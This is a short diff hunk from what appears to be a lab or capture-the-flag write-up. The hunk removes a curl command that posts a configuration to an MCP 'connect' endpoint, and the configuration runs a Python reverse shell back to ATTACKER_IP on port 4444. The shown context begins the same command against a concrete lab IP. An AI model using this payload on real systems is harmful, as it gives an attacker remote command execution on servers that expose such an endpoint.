@@ -777,8 +777,6 @@ listening on [any] 4444 ...
 
 **Command:**
 
-`curl -s -X POST http://TARGET_IP:6274/api/mcp/connect -H "Content-Type: application/json" -d '{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"],"serverId":"revshell"}}'`
-
 ```
 curl -s -X POST http://10.129.245.216:6274/api/mcp/connect \
   -H "Content-Type: application/json" \
